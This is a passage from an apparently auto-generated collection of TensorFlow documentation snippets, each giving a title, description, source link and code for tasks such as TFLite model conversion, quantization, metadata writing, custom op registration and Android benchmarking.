handle dense tensors, no optional parameters, no broadcasting, etc..

cond: tf.Tensor or list of tf.Tensor of type bool. If it is a list, `a_values`
      must be a list of the same length. Where True, yield the corresponding
      element from `a_values` (with priority to the first one encountered in
      lists), otherwise yield `b_values`.
a_values: tf.Tensor or list of tf.Tensor. Each tensor has the same type and
          shape as `b_values`. If it is a list, `cond` must be a list of the
          same length.
b_values: tf.Tensor with the same type and shape as the `a_values` if it is a
          tensor or as every element of `a_values` if `a_values` is a list.
output_values: A tf.Tensor with elements from `a_values` where `cond` is True,
               and elements from `b` elsewhere.
)doc");

```

----------------------------------------

TITLE: Executing Function with Python List Modification in Graph Mode Error Python
DESCRIPTION: Attempts to execute the `fn()` function defined previously after tracing it with `tf.function`. This fails in graph execution because modifying the Python list `l` inside the `tf.while_loop` (even if written as a Python loop converted by AutoGraph) is an illegal tensor capture.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_25

LANGUAGE: Python
CODE:
```
tf.function(fn)()  # Error -- illegal tensor capture!
```

----------------------------------------

TITLE: Verifying Quantized TFLite Model Output
DESCRIPTION: Loads the quantized TFLite model into an interpreter, performs inference on the same sample input used for verification (`train_images[0:1]`), and uses `np.testing.assert_almost_equal` to verify that the quantized model's output is still numerically consistent with the original JAX model's output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_12

LANGUAGE: Python
CODE:
```
expected = serving_func(train_images[0:1])

# Run the model with TensorFlow Lite
interpreter = tf.lite.Interpreter(model_content=tflite_quant_model)
interpreter.allocate_tensors()
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()
interpreter.set_tensor(input_details[0]["index"], train_images[0:1, :, :])
interpreter.invoke()
result = interpreter.get_tensor(output_details[0]["index"])

# Assert if the result of TFLite model is consistent with the Jax model.
np.testing.assert_almost_equal(expected, result, 1e-5)
```

----------------------------------------

TITLE: Predicting with TFLite Model in TensorFlow Lite
DESCRIPTION: Runs inference using a TensorFlow Lite model stored at a given file path on a provided dataset. This method is used for getting predictions from the optimized TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_9

LANGUAGE: python
CODE:
```
predict_tflite(
    tflite_filepath, dataset
)

```

----------------------------------------

TITLE: Saving Trained Weights with TFLite Signature Python
DESCRIPTION: Uses the 'save' signature runner from the TensorFlow Lite interpreter to export the model's current weights (updated after on-device training) to a specified checkpoint file path. The path is provided as a NumPy string array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
save = interpreter.get_signature_runner("save")

save(checkpoint_path=np.array("/tmp/model.ckpt", dtype=np.string_))
```

----------------------------------------

TITLE: Install Required Packages for TFLite Model Maker - Python
DESCRIPTION: This snippet installs the necessary system library and Python packages for running the tutorial. It includes libportaudio2 for potential audio processing, the tflite-model-maker library from GitHub, and the gdown utility for downloading files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
!sudo apt -y install libportaudio2
!pip install -q tflite-model-maker
!pip install gdown
```

----------------------------------------

TITLE: Passing TensorFlow Lite Classification Results to Listener - Kotlin
DESCRIPTION: Calls the `onResult` method of a `listener` object, passing the list of classification categories (`results`) and the calculated `inferenceTime`. This allows the UI or other components to process the classification output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_9

LANGUAGE: Kotlin
CODE:
```
fun classify(text: String) {
  ...
  listener.onResult(results, inferenceTime)
}
```

----------------------------------------

TITLE: Evaluate TFLite Model (Python)
DESCRIPTION: Evaluates a saved TensorFlow Lite model (.tflite file) using the provided data. It returns the evaluation accuracy. An optional postprocessing function can be applied to the model output before calculating metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_6

LANGUAGE: Python
CODE:
```
evaluate_tflite(
    tflite_filepath, data, postprocess_fn=None
)
```

----------------------------------------

TITLE: Disposing Core ML Delegate (Objective-C++)
DESCRIPTION: Provides the C API call (TfLiteCoreMlDelegateDelete) required to free the resources associated with the Core ML delegate. This should be called when the delegate is no longer needed, typically during object deallocation or cleanup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_3

LANGUAGE: Objective-C++
CODE:
```
TfLiteCoreMlDelegateDelete(delegate);
```

----------------------------------------

TITLE: Initializing TFLite Support TextSearcher (Python)
DESCRIPTION: The constructor for the `TextSearcher` class, typically not called directly but used internally. It requires `TextSearcherOptions` to configure the search and a C++ internal searcher object. This method initializes the text searcher instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextSearcher.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.TextSearcher(
    options: tflite_support.task.text.TextSearcherOptions,
    cpp_searcher: _CppTextSearcher
) -> None
```

----------------------------------------

TITLE: Exporting TFLite Model with BrowserFftSpec (Python)
DESCRIPTION: Converts the Keras model to the TFLite format and saves it to a specified file path. This method includes preprocessing steps within the exported TFLite model and supports adding metadata and quantization configurations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_3

LANGUAGE: Python
CODE:
```
export_tflite(
    model,
    tflite_filepath,
    with_metadata=True,
    export_metadata_json_file=True,
    index_to_label=None,
    quantization_config=None
)
```

----------------------------------------

TITLE: Creating MetadataPopulator from Model File - Python
DESCRIPTION: This class method creates a MetadataPopulator instance that operates directly on a TensorFlow Lite model file located at the specified path. It serves as the starting point for adding or modifying metadata and associated files for a model stored on disk.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_13

LANGUAGE: Python
CODE:
```
@classmethod
with_model_file(
    model_file
)
```

----------------------------------------

TITLE: Visualizing TFLite Model (TF 2.5+) (Shell)
DESCRIPTION: This command visualizes a TensorFlow Lite (`.tflite`) model by generating an HTML file. It uses the built-in `tensorflow.lite.tools.visualize` module directly via the Python interpreter. This method is applicable for TensorFlow versions 2.5 and later.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/faq.md#_snippet_1

LANGUAGE: shell
CODE:
```
python -m tensorflow.lite.tools.visualize model.tflite visualized_model.html
```

----------------------------------------

TITLE: Registering SavedModel Serializable Classes in Python
DESCRIPTION: Demonstrates the syntax for registering a custom class to be serializable for SavedModel. For TensorFlow-internal classes, `register_tf_serializable` is used; otherwise, `register_serializable` with a package name is required.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/registration/README.md#_snippet_0

LANGUAGE: python
CODE:
```
registration.register_serializable(package, name)
registration.register_tf_serializable(name)  # If TensorFlow-internal.
```

----------------------------------------

TITLE: Executing Simple TF NumPy Function in Distribution Strategy
DESCRIPTION: Defines a `@tf.function` that uses `tf.distribute.get_replica_context` to get the replica ID and performs a simple TF NumPy operation (`tnp.asarray`). The function is executed using `strategy.run`, demonstrating how basic TF NumPy code is replicated and run on each device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
@tf.function
def replica_fn():
  replica_id = tf.distribute.get_replica_context().replica_id_in_sync_group
  print("Running on device %s" % replica_id.device)
  return tnp.asarray(replica_id) * 5

print(strategy.run(replica_fn).values)
```

----------------------------------------

TITLE: Load HuggingFace FLAX Resnet50 Python
DESCRIPTION: This code downloads and loads a pre-trained Resnet50 model and its associated image processor from Hugging Face using the `transformers` library. It then processes the test image and performs an initial inference using the loaded FLAX model to demonstrate its base functionality before conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
from transformers import ConvNextImageProcessor, FlaxResNetForImageClassification

image_processor = ConvNextImageProcessor.from_pretrained("microsoft/resnet-50")
model = FlaxResNetForImageClassification.from_pretrained("microsoft/resnet-50")

inputs = image_processor(images=image, return_tensors="np")
outputs = model(**inputs)
logits = outputs.logits

# model predicts one of the 1000 ImageNet classes
predicted_class_idx = jax.numpy.argmax(logits, axis=-1)
print("Predicted class:", model.config.id2label[predicted_class_idx.item()])
```

----------------------------------------

TITLE: Declaring TensorFlow Lite Delegate Variable - Kotlin
DESCRIPTION: Declares a mutable integer variable `currentDelegate` to hold the selected hardware acceleration delegate option. It is initialized to 0, typically representing the default CPU execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_5

LANGUAGE: Kotlin
CODE:
```
var currentDelegate: Int = 0
```

----------------------------------------

TITLE: Defining JAX Function for HLO Example (Python)
DESCRIPTION: Defines a simple JAX function `f` that performs matrix multiplication, scaling, and negation. This function serves as the running example for demonstrating the XLA pipeline and HLO generation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/gpu_architecture.md#_snippet_0

LANGUAGE: Python
CODE:
```
def f(a, b):
    return -((a @ b) * 0.125)
```

----------------------------------------

TITLE: Saving TFLite Models to Filesystem Python
DESCRIPTION: Imports the `pathlib` module for working with filesystem paths. It defines a target directory path `/tmp/mnist_tflite_models/` and uses `mkdir(exist_ok=True, parents=True)` to create this directory if it doesn't already exist, along with any necessary parent directories. This prepares the location for saving the generated TFLite model files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
import pathlib

tflite_models_dir = pathlib.Path("/tmp/mnist_tflite_models/")
tflite_models_dir.mkdir(exist_ok=True, parents=True)
```

----------------------------------------

TITLE: Initializing MetadataWriter in TFLite Support Python
DESCRIPTION: Initializes an instance of the MetadataWriter class, used for writing metadata into a TFLite audio classifier model. It requires the model buffer and can optionally take a pre-existing metadata buffer and a list of associated file paths to embed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.audio_classifier.MetadataWriter(
    model_buffer: bytearray,
    metadata_buffer: Optional[bytearray] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: Generate GPU Subgraph Alternative (Lowered Pack) - TFLite/MLIR
DESCRIPTION: Defines another alternative MLIR function (@func_2_GPU_FLOAT) generated for the "GPU". It illustrates how an unsupported operation like tfl.pack is lowered into a sequence of supported operations (tfl.reshape, tfl.concatenation) to create a valid subgraph for the GPU device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_10

LANGUAGE: MLIR
CODE:
```
func private @func_2_GPU_FLOAT(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>) -> tensor<2x1xf32> attributes {tac.device = "GPU", tac.inference_type = "FLOAT", tac.interface_name = "func_2"} {
    %cst = arith.constant dense<1> : tensor<4xi32>
    %cst_0 = arith.constant dense<2> : tensor<1xi32>
    %cst_1 = arith.constant dense<[2, 1]> : tensor<2xi32>
    %0 = "tfl.reshape"(%arg0, %cst) {tac.device = "GPU", tac.inference_type = "FLOAT"} : (tensor<1xf32>, tensor<4xi32>) -> tensor<1x1x1x1xf32>
    %1 = "tfl.reshape"(%arg1, %cst) {tac.device = "GPU", tac.inference_type = "FLOAT"} : (tensor<1xf32>, tensor<4xi32>) -> tensor<1x1x1x1xf32>
    %2 = "tfl.concatenation"(%0, %1) {axis = 3 : i32, fused_activation_function = "NONE", tac.device = "GPU", tac.inference_type = "FLOAT"} : (tensor<1x1x1x1xf32>, tensor<1x1x1x1xf32>) -> tensor<1x1x1x2xf32>
    %3 = "tfl.reshape"(%2, %cst_0) {tac.device = "GPU", tac.inference_type = "FLOAT"} : (tensor<1x1x1x2xf32>, tensor<1xi32>) -> tensor<2xf32>
    %4 = "tfl.reshape"(%3, %cst_1) {tac.device = "GPU", tac.inference_type = "FLOAT"} : (tensor<2xf32>, tensor<2xi32>) -> tensor<2x1xf32>
    return %4 : tensor<2x1xf32>
  }
```

----------------------------------------

TITLE: Exporting TFLite Model with Custom Quantization - Python
DESCRIPTION: Exports the trained model to a TensorFlow Lite file, applying the specified post-training quantization configuration. This allows customizing the quantization technique, such as using float16, to balance model size, speed, and accuracy. Requires a trained model and a QuantizationConfig object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_18

LANGUAGE: python
CODE:
```
model.export(export_dir='.', tflite_filename='model_fp16.tflite', quantization_config=config)
```

----------------------------------------

TITLE: Defining TensorFlow Op Interface (C++)
DESCRIPTION: Registers the custom operation interface using the `REGISTER_OP` macro. It defines the operation name, input/output tensors, attributes (like data type `T`), and specifies a shape inference function to validate input shapes and determine the output shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_1

LANGUAGE: cpp
CODE:
```
REGISTER_OP("Examples>MultiplexDense")
    .Input("cond: bool")
    .Input("a: T")
    .Input("b: T")
    .Output("output_values: T")
    .Attr("T: type")
    .SetShapeFn([](tensorflow::shape_inference::InferenceContext* c) {
      // Determine the output shape and also assert that inputs 0 and 1 have
      // the same shape.
      tensorflow::shape_inference::ShapeHandle out;
      TF_RETURN_IF_ERROR(c->Merge(c->input(0), c->input(1), &out));
      // Assert that inputs 0 and 2 have the same shape, i.e. that all inputs
      // have the same shape. This is optional, but it is desirable
      // to raise errors about inconsistent input shapes early when using
      // graph mode.
      tensorflow::shape_inference::ShapeHandle unused;
      TF_RETURN_IF_ERROR(c->Merge(c->input(0), c->input(2), &unused));

      c->set_output(0, out);
      return ::tensorflow::OkStatus();
    })
    .Doc(R"doc(
Return elements chosen from `a` or `b` depending on `cond`.

This is similar to `np.where` and `tf.where`, but simplified to only handle
the case of dense tensors, no optional parameters, no broadcasting, etc..
This uses cond.select from the Eigen library and supports GPU (and CPU).

cond: tf.Tensor of type bool.
a: tf.Tensor with the same type and shape as `b`.
b: tf.Tensor with the same type and shape as `a`.

      Where True, yield `a`, otherwise yield `b`.
output_values: A tf.Tensor with elements from `a` where `cond` is True, and
               elements from `b` elsewhere.
)doc");
```

----------------------------------------

TITLE: Evaluating Float TFLite Model Accuracy Python
DESCRIPTION: Calls the evaluate_model helper function, passing the interpreter loaded with the standard (float) TensorFlow Lite model. It then prints the returned accuracy score to the console.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
print(evaluate_model(interpreter))
```

----------------------------------------

TITLE: Using the Custom TensorFlow Multiplex Op (Python)
DESCRIPTION: Demonstrates how to import the custom multiplex op Python wrapper and call the `multiplex` function with example tensor inputs. This snippet shows the typical usage pattern for the custom operation within a Python script.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_13

LANGUAGE: python
CODE:
```
import tensorflow as tf

from tensorflow.examples.custom_ops_doc.multiplex_2 import multiplex_2_op

a = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
b = tf.constant([10, 20, 30, 40, 50], dtype=tf.int64)
cond = tf.constant([True, False, True, False, True], dtype=bool)
# expected result is [1, 20, 3, 40, 5]
result = multiplex_2_op.multiplex(cond, a, b)
```

----------------------------------------

TITLE: Configuring Android NDK ABI Filters (Gradle)
DESCRIPTION: This Gradle configuration snippet demonstrates how to specify ABI filters within the `android.defaultConfig.ndk` block of a `build.gradle` file. It includes `armeabi-v7a` and `arm64-v8a` to reduce APK size by limiting included native libraries to these common architectures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/development.md#_snippet_2

LANGUAGE: Gradle
CODE:
```
android {
    defaultConfig {
        ndk {
            abiFilters 'armeabi-v7a', 'arm64-v8a'
        }
    }
}
```

----------------------------------------

TITLE: Creating Serving Model with YamNetSpec [Python]
DESCRIPTION: Takes a training model and prepares it specifically for inference or serving purposes. This might involve optimizing the model graph or adding serving-specific layers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/YamNetSpec.md#_snippet_2

LANGUAGE: python
CODE:
```
create_serving_model(
    training_model
)
```

----------------------------------------

TITLE: Installing Core Dependencies
DESCRIPTION: Installs the latest TensorFlow nightly build and the JAX library via pip, which are essential prerequisites for building and converting JAX models as described in the guide.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_1

LANGUAGE: Python
CODE:
```
!pip install tf-nightly --upgrade
!pip install jax --upgrade
```

----------------------------------------

TITLE: Evaluating Trained Model - Python
DESCRIPTION: Evaluates the performance of the currently trained image classification model using the provided test dataset. It returns metrics like loss and accuracy, allowing you to assess the model's generalization ability on unseen data. Requires a trained model object and a compatible test data object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_20

LANGUAGE: python
CODE:
```
loss, accuracy = model.evaluate(test_data)
```

----------------------------------------

TITLE: Push TFLite Model to Device via ADB
DESCRIPTION: This command pushes a TensorFlow Lite model file ('mobilenet_quant_v1_224.tflite') from the local machine to the '/data/local/tmp' directory on the connected Android device. This directory is often used for temporary files accessible by apps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_4

LANGUAGE: Shell
CODE:
```
adb push mobilenet_quant_v1_224.tflite /data/local/tmp
```

----------------------------------------

TITLE: Generating Dumps for Reproducible XLA Bug Reports Shell
DESCRIPTION: A comprehensive shell command incorporating flags for both graph dumping (`TF_DUMP_GRAPH_PREFIX`, `TF_XLA_FLAGS`) and compiled program dumping (`XLA_FLAGS`). This generates all necessary artifacts in one go to create detailed and reproducible bug reports for XLA issues.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_11

LANGUAGE: Shell
CODE:
```
$ TF_DUMP_GRAPH_PREFIX=/tmp/generated \
  TF_XLA_FLAGS="--tf_xla_clustering_debug --tf_xla_auto_jit=2" \
  XLA_FLAGS="--xla_dump_hlo_as_text --xla_dump_to=/tmp/generated" \
    my/tensorflow/program"
```

----------------------------------------

TITLE: Defining Incompatible TensorFlow Function Python
DESCRIPTION: Defines a basic `tf.function` named `f` using `tf.cosh`, which is typically not a built-in TensorFlow Lite operation. This serves as an example of a function that would cause a standard TFLite conversion to fail. The snippet also evaluates the function to show it works correctly in TensorFlow before attempting conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
@tf.function(input_signature=[
 tf.TensorSpec(shape=[None], dtype=tf.float32)
])
def f(x):
 return tf.cosh(x)

# Evaluate the tf.function
result = f(tf.constant([0.0]))
print (f"result = {result}")
```

----------------------------------------

TITLE: Profile TensorFlow Trainable Variables (Python API)
DESCRIPTION: Profile the trainable variables in a TensorFlow graph using the tf.profiler Python API. The ProfileOptionBuilder is used to specify profiling options, targeting trainable variables, and the total parameter count is then printed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_model_architecture.md#_snippet_1

LANGUAGE: python
CODE:
```
param_stats = tf.profiler.profile(
    tf.get_default_graph(),
    options=tf.profiler.ProfileOptionBuilder
        .trainable_variables_parameter())
sys.stdout.write('total_params: %d\n' % param_stats.total_parameters)
```

----------------------------------------

TITLE: Creating Mandatory Metadata for TFLite Inference (Python)
DESCRIPTION: Creates mandatory metadata required for TFLite Support inference features like Task library and Codegen. Other metadata fields are set to default. Use `create_from_metadata_info` for filling additional fields.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/nl_classifier/MetadataWriter.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
create_for_inference(
    model_buffer: bytearray,
    tokenizer_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/RegexTokenizerMd"><code>tflite_support.metadata_writers.metadata_info.RegexTokenizerMd</code></a>],
    label_file_paths: List[str]
)
```

----------------------------------------

TITLE: Training Question Answer Model with Data in Python
DESCRIPTION: Feeds the provided training data to the model to perform the training process. It accepts training data and optional parameters to control the number of epochs, batch size, and steps per epoch.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_8

LANGUAGE: python
CODE:
```
train(
    train_data, epochs=None, batch_size=None, steps_per_epoch=None
)
```

----------------------------------------

TITLE: Example of TensorFlow Registration for Saving and Checkpointing in Python
DESCRIPTION: A complete example demonstrating how to register custom `Part` and `Stack` classes for serialization and implement custom save/restore logic for checkpointing. It shows the use of `@registration.register_serializable` and `registration.register_checkpoint_saver` with custom `save_fn` and `restore_fn` implementations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/registration/README.md#_snippet_4

LANGUAGE: python
CODE:
```
@registration.register_serializable()
class Part(resource_variable_ops.ResourceVariable):

  def __init__(self, value):
    self._init_from_args(value)

  @classmethod
  def _deserialize_from_proto(cls, **kwargs):
    return cls([0, 0])


@registration.register_serializable()
class Stack(tracking.AutoTrackable):

  def __init__(self, parts=None):
    self.parts = parts

  @def_function.function(input_signature=[])
  def value(self):
    return array_ops_stack.stack(self.parts)


def get_tensor_slices(trackables):
  tensor_names = []
  shapes_and_slices = []
  tensors = []
  restored_trackables = []
  for obj_prefix, obj in trackables.items():
    if isinstance(obj, Part):
      continue  # only save stacks
    tensor_names.append(obj_prefix + "/value")
    shapes_and_slices.append("")
    x = obj.value()
    with ops.device("/device:CPU:0"):
      tensors.append(array_ops.identity(x))
    restored_trackables.append(obj)

  return tensor_names, shapes_and_slices, tensors, restored_trackables


def save_stacks_and_parts(trackables, file_prefix):
  """Save stack and part objects to a checkpoint shard."""
  tensor_names, shapes_and_slices, tensors, _ = get_tensor_slices(trackables)
  io_ops.save_v2(file_prefix, tensor_names, shapes_and_slices, tensors)
  return file_prefix


def restore_stacks_and_parts(trackables, merged_prefix):
  tensor_names, shapes_and_slices, tensors, restored_trackables = (
      get_tensor_slices(trackables))
  dtypes = [t.dtype for t in tensors]
  restored_tensors = io_ops.restore_v2(merged_prefix, tensor_names,
                                       shapes_and_slices, dtypes)
  for trackable, restored_tensor in zip(restored_trackables, restored_tensors):
    expected_shape = trackable.value().get_shape()
    restored_tensor = array_ops.reshape(restored_tensor, expected_shape)
    parts = array_ops_stack.unstack(restored_tensor)
    for part, restored_part in zip(trackable.parts, parts):
      part.assign(restored_part)


registration.register_checkpoint_saver(
    name="stacks",
    predicate=lambda x: isinstance(x, (Stack, Part)),
    save_fn=save_stacks_and_parts,
    restore_fn=restore_stacks_and_parts)
```

----------------------------------------

TITLE: Running Android Benchmark Tool via ADB Shell
DESCRIPTION: This command executes the benchmark tool on the Android device using adb shell. It specifies the graph file path, input layer name, shape, type, and output layer name as command-line arguments to the benchmark binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_3

LANGUAGE: Bash
CODE:
```
adb shell /data/local/tmp/benchmark_model \
  --graph=/data/local/tmp/tensorflow_inception_graph.pb \
  --input_layer="input:0" \
  --input_layer_shape="1,224,224,3" \
  --input_layer_type="float" \
  --output_layer="output:0"
```

----------------------------------------

TITLE: Implementing RecyclerView Adapter for Questions - Kotlin
DESCRIPTION: Defines a RecyclerView adapter responsible for displaying a list of suggested questions. Its ViewHolder binds each question string to a TextView and includes a click listener that notifies the calling code when a question is selected, passing the position of the clicked item.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_8

LANGUAGE: Kotlin
CODE:
```
class QaAdapter(private val question: List<String>, private val select: (Int) -> Unit) :
 RecyclerView.Adapter<QaAdapter.ViewHolder>() {

 inner class ViewHolder(private val binding: ItemQuestionBinding) :
 RecyclerView.ViewHolder(binding.root) {
 init {
 binding.tvQuestionSuggestion.setOnClickListener {
 select.invoke(adapterPosition)
 }
 }

 fun bind(question: String) {
 binding.tvQuestionSuggestion.text = question
 }
 }
 ...
}
```

----------------------------------------

TITLE: Instantiating Custom Model Python
DESCRIPTION: This snippet instantiates the custom Model class, configuring it with specified vocabulary size, embedding dimension, number of RNN units, and enabling the stateful mode.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_22

LANGUAGE: python
CODE:
```
model = Model(
  vocab_size = vocab_size,
  embedding_dim=embedding_dim,
  rnn_units=rnn_units,
  stateful=True)
```

----------------------------------------

TITLE: Loading Object Detection Dataset from CSV Python
DESCRIPTION: Loads the dataset from a CSV file located at a Google Cloud Storage path using `object_detector.DataLoader.from_csv`. It automatically splits the data into training, validation, and test sets, which are required for the subsequent steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
train_data, validation_data, test_data = object_detector.DataLoader.from_csv('gs://cloud-ml-data/img/openimage/csv/salads_ml_use.csv')
```

----------------------------------------

TITLE: Transferring TFLite Model Metadata - Python
DESCRIPTION: This snippet demonstrates how to copy existing metadata and associated files from a source TFLite model buffer (`src_model_buf`) to a destination TFLite model buffer. It initializes the `MetadataPopulator` for the destination model buffer and then uses `load_metadata_and_associated_files` to load data from the source buffer. The updated destination model buffer is then retrieved and can be saved.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_2

LANGUAGE: Python
CODE:
```
# Transferring metadata and associated files from another TFLite model:
populator = MetadataPopulator.with_model_buffer(model_buf)
populator_dst.load_metadata_and_associated_files(src_model_buf)
populator_dst.populate()
updated_model_buf = populator.get_model_buffer()
with open("updated_model.tflite", "wb") as f:
  f.write(updated_model_buf)
```

----------------------------------------

TITLE: Evaluating Image Classifier Model - Python TensorFlow
DESCRIPTION: Assesses the performance of the trained model on provided evaluation data. It takes the evaluation data and batch size as input. Returns the computed loss value and accuracy of the model on the given dataset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_4

LANGUAGE: Python
CODE:
```
evaluate(
    data, batch_size=32
)
```

----------------------------------------

TITLE: Restoring TFLite Model Weights - Java (Android)
DESCRIPTION: Shows the Java implementation for loading trained weights into a TFLite `Interpreter` from a checkpoint file in an Android application. It uses the `restore` signature with the checkpoint file path provided as an input parameter in a `Map`. The snippet uses a `try-with-resources` block to ensure the interpreter is closed properly after the operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_20

LANGUAGE: Java
CODE:
```
try (Interpreter anotherInterpreter = new Interpreter(modelBuffer)) {
    // Load the trained weights from the checkpoint file.
    File outputFile = new File(getFilesDir(), "checkpoint.ckpt");
    Map<String, Object> inputs = new HashMap<>();
    inputs.put("checkpoint_path", outputFile.getAbsolutePath());
    Map<String, Object> outputs = new HashMap<>();
    anotherInterpreter.runSignature(inputs, outputs, "restore");
}
```

----------------------------------------

TITLE: Running Classifier Training with BrowserFftSpec (Python)
DESCRIPTION: Trains the audio classification model using the provided training and validation datasets. Requires the model instance, the number of training epochs, and accepts additional keyword arguments for the training process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_6

LANGUAGE: Python
CODE:
```
run_classifier(
    model, epochs, train_ds, validation_ds, **kwargs
)
```

----------------------------------------

TITLE: Calculate Confusion Matrix for Audio Classifier (Python)
DESCRIPTION: Calculates the confusion matrix for the audio classifier using the provided data. This helps assess the performance of the model by showing the counts of true positive, true negative, false positive, and false negative predictions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_1

LANGUAGE: Python
CODE:
```
confusion_matrix(
    data, batch_size=32
)
```

----------------------------------------

TITLE: Clone TensorFlow Repository
DESCRIPTION: Clones the official TensorFlow repository from GitHub into a local directory named 'tensorflow_src'. This fetches the complete source code, including the TensorFlow Lite component, which is required for the build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_1

LANGUAGE: sh
CODE:
```
git clone https://github.com/tensorflow/tensorflow.git tensorflow_src
```

